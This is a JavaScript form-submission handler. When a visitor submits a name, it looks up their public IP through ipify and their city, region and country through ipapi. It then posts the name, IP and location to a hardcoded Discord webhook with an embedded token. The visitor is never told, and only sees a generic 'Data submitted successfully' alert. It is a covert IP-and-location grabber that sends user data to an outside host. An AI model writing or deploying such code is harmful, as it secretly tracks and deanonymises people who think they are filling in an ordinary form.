
document.getElementById("myForm").addEventListener("submit", async function(event) {
  event.preventDefault();
  var name = document.getElementById("name").value;
  if(name.toLowerCase() === "danisgod") {
    console.log("You invoked the power of Dan!");
    alert("You invoked the power of Dan!");
    document.getElementById("outputBox").innerText = "You invoked the power of Dan!";
    document.getElementById("name").value = "";
    return;
  }
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIp = ipData.ip;
    const geoResponse = await fetch(`https://ipapi.com/api/${userIp}?api_key=YOUR_API_KEY`);
    const geoData = await geoResponse.json();
    const { city, region, country_name } = geoData;
    const discordPayload = {
      content: `New submission:\nName: ${name}\nUser IP: ${userIp}\nLocation: ${city}, ${region}, ${country_name}`
    };
    const webhookUrl = 'https://discord.com/api/webhooks/1232847300125130763/Q0Fe1iehHKm6L1XnzH5urs5I_ajPNpOcasLr1F4-qspBgQ3hBOOVG_6wMrL4-htRYqJe';
    const discordResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      throw new Error('Failed to send data to Discord');
    }
    alert("Data submitted successfully");
    document.getElementById("myForm").reset();
  } catch (error) {
    console.error("Error sending data to Discord:", error);
    document.getElementById("errorMessage").innerText = 'ERROR - ' + error.message;
  }
});
